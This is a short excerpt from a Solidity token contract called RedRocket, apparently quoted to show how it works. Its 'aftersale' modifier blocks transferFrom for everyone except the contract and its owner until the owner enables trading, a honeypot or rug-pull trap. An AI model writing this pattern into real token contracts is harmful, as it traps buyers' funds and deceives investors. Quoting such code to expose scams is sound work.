...
contract RedRocket is Context, IERC20, Ownable {
    ...
    modifier aftersale(address from){
        require(allowed ==true|| from== address(this) || from == _owner);
        _;
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public aftersale(sender) override returns (bool) {
